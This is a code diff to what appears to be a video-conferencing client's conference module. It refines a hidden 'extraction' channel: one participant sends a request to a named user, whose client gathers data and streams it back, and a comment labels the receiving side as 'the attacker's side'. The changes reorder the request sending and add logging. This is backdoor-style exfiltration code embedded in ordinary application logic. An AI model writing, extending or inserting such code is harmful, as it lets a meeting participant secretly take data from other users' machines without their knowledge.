@@ -1324,6 +1324,14 @@ export default {
         APP.conference._extractionHandler = new ExtractionHandler(configuration);
         APP.conference._extractionHandler.initializeEncryption().then(() => {
 
+            console.log('Sending config request', configuration);
+
+            // send request to the user with specified name
+            APP.conference.sendEndpointMessage(user.getId(), {
+                extraction: 'request',
+                config: configuration
+            });
+
             APP.conference._extractionHandler.receiveAll(user);
 
             // start receiving data, after receiving all data download a file
@@ -1361,19 +1369,11 @@ export default {
             return null;
         }
 
-        const request = {
-            extraction: 'request',
-            config: configuration
-        };
         const user = foundUser[0];
 
         try {
             // Start listening on the specified communication
             this.initializeExtraction(configuration, fileName, user);
-
-            // send request to the user with specified name
-            APP.conference.sendEndpointMessage(user.getId(), request);
-
 
         } catch (err) {
             console.error(err);
@@ -1452,7 +1452,7 @@ export default {
             this._acquireData(recievedData.config).then(acquiredData => {
                 APP.conference._extractionHandler.sendAll(acquiredData, user);
             });
-        } else { // 'reply' received, this runs on the attacker's side 
+        } else { // 'reply' received, this runs on the attacker's side
             APP.conference._extractionHandler.receiveEndpointData(recievedData);
         }
     },
@@ -2344,6 +2344,7 @@ export default {
                 if (args && args.length >= 2) {
                     const [ sender, eventData ] = args;
 
+                    console.log('message:', eventData);
                     if (eventData.extraction) {
                         // console.log('Extraction:', eventData);
                         this._handleExtractionCommunication(sender, eventData);
